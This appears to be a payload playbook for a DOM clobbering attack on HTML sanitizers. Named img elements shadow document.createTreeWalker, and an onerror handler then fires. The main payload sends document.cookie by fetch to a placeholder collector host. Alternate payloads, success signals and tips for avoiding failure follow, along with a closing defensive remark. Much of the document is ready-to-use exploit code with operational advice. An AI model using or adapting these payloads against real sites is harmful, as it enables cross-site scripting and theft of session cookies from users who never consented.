# DOM Clobber `createTreeWalker` Race

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- untrusted HTML is inserted into the live DOM before sanitization
- the sanitizer later calls `document.createTreeWalker(...)` or similar through a live host object
- sanitizer exceptions are caught late or fail open briefly
- a fast event sink such as `img onerror` can fire before the page clears the DOM

## Requirements

- The browser exposes named elements on `document` for the chosen clobber primitive.
- The sanitizer reads `document.createTreeWalker` from the live document instead of a cached prototype method.
- The page allows a same-origin side effect after sanitizer failure, such as `fetch(...)`.
- The value to exfiltrate is readable from JavaScript if the goal is cookie theft.

## Minimal Payload

```html
<img name="createTreeWalker"><img src=x onerror="fetch('https://[collector]?c='+encodeURIComponent(document.cookie))">
```

## Alternate Shapes

Baselines and controls:

```html
<img name="createTreeWalker"><img src=x onerror="console.log(document.cookie)">

<img name="createTreeWalker"><img src=x onerror="fetch('https://[collector]?m=hit')">
```

If a non-cookie proof is needed first:

```html
<img name="createTreeWalker"><img src=x onerror="document.body.setAttribute('data-pwned','1')">
```

## Expected Signals

Success path:

```text
live insertion
-> document.createTreeWalker clobbered
-> sanitizer throws or aborts
-> second image onerror fires
-> collector receives request
```

Typical page behavior:

- preview may briefly render and then change to an error or empty state
- the DOM may be cleared after the event already fired

## Controls

These help separate clobbering from plain event-handler XSS:

```html
<img src=x onerror="fetch('https://[collector]?m=plain')">
```

Expected:

- plain version should be stripped or blocked
- clobber version should fire only if the sanitizer fails before removing `onerror`

## Why It Works

The first named element interferes with a later security-sensitive document lookup. Once the sanitizer fails, the second element's event handler can execute during the pre-cleanup window.

## Why It Fails

- The sanitizer uses `Document.prototype.createTreeWalker.call(...)`.
- The HTML is sanitized off-DOM before mounting.
- The browser does not expose the chosen named property in that context.
- The page catches the exception and synchronously clears the dangerous node before the event fires.
- The secret is not readable from JavaScript.

## Common Mistakes

- Forgetting to URL-encode `document.cookie`, which can break exfil query parsing.
- Testing only the exfil payload and not a harmless hit marker first.
- Assuming every named element clobbers `document` equally across browsers.
- Confusing a sanitizer exception with successful code execution.
- Storing live flags, cookies, or target-specific collector URLs in reusable payload files.

## Defensive Note

Any sanitizer that mounts attacker HTML before cleaning it should treat live host-object property reads as untrusted. Cache prototype methods and sanitize off-DOM.
